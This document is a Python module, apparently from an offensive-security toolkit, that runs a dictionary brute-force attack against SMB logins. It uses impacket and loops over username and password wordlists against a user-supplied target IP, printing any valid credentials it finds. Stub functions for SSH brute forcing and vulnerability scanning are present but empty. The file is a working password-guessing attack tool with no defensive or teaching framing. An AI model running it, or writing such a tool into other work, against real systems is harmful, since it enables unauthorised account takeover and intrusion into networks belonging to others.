from core.utils import open_file
from core.colors import Colors as cl
from impacket.smbconnection import SMBConnection

def attempt_smb_login(target_ip, username, password):
    try:
        conn = SMBConnection(target_ip, target_ip, sess_port=445, timeout=3)
        conn.login(username, password)
        print(f"{cl.green}[+] SUCCESS: {username}:{password}{cl.reset}")
        conn.close()
        return True
    except Exception as e:
        #print(f"{cl.red}[-] FAILED: {username}:{password} | {str(e)}{cl.reset}")
        return False

def brute_force_smb():
    try:
        print(f"{cl.yellow}[~] SMB Brute Force Attack: Provide the target IP and choose wordlists for usernames and passwords.{cl.reset}")
        target_ip = input(f"{cl.blue}[>] Target IP (e.g. 192.168.0.53): {cl.reset}").strip()
        if not target_ip:
            raise Exception("No target IP provided.") 

        user_file_name, user_file_path = open_file("Username wordlist")
        print(f"{cl.cyan}[*] Selected username wordlist: {user_file_name}{cl.reset}")
        password_file_name, password_file_path = open_file("Password wordlist")
        print(f"{cl.cyan}[*] Selected password wordlist: {password_file_name}{cl.reset}")
        
        with open(user_file_path, "r") as uf:
            usernames = [line for line in uf.read().splitlines() if line]

        with open(password_file_path, "r") as pf:
            passwords = [line for line in pf.read().splitlines() if line]

        print(f"{cl.cyan}[*] Loaded {len(usernames)} users and {len(passwords)} passwords.{cl.reset}")
        print(f"{cl.cyan}[~] Starting SMB brute-force attack on {target_ip}...{cl.reset}")

        for username in usernames:
            for password in passwords:
                success = attempt_smb_login(target_ip, username, password)
                if success:
                    print(f"{cl.yellow}[!] Stopping brute-force. Valid credentials found!{cl.reset}")
                    return
                
        print(f"{cl.yellow}[!] Brute force completed - no valid credentials found.{cl.reset}")

    except KeyboardInterrupt:
        print(f"\n{cl.yellow}[!] SMB brute force interrupted by user.{cl.reset}")
        return
    except Exception as e:
        print(f"{cl.red}[!] Brute force SMB failed: {e}{cl.reset}")

def brute_force_ssh():
    try:
        pass
    except Exception as e:
        print(f"{cl.red}[!] Brute force SSH failed: {e}{cl.reset}")

def scan_vulnerabilities():
    try:
        pass
    except Exception as e:
        print(f"{cl.red}[!] Error scanning for vulberabilities failed: {e}{cl.reset}")